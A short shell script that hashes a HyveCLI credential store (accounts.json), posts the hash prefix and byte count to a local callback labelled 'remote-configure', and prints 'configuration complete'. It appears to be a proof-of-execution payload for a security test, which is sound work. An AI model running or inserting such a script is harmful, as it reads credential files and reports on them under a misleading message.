#!/bin/sh
set -eu
store=/home/stazot/HyveCLI/data/accounts.json
proof=$(sha256sum "$store" | cut -c1-20)
bytes=$(wc -c < "$store" | tr -d ' ')
curl -fsS -X POST --data "vector=remote-configure&cred_sha20=$proof&bytes=$bytes" http://127.0.0.1:18080/callback/remote-configure >/dev/null
printf '%s\n' 'configuration complete'

